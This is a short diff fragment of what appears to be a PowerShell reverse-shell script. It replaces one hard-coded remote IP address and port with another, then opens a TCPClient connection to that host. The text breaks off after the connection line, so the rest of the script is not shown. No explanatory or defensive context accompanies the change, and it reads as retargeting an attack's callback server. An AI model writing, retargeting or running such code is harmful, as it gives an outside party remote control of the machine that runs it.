@@ -1,5 +1,5 @@
-$ip = "89.22.168.70"
-$port = 15177
+$ip = "164.92.236.24"
+$port = 8443
 
 try {
     $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
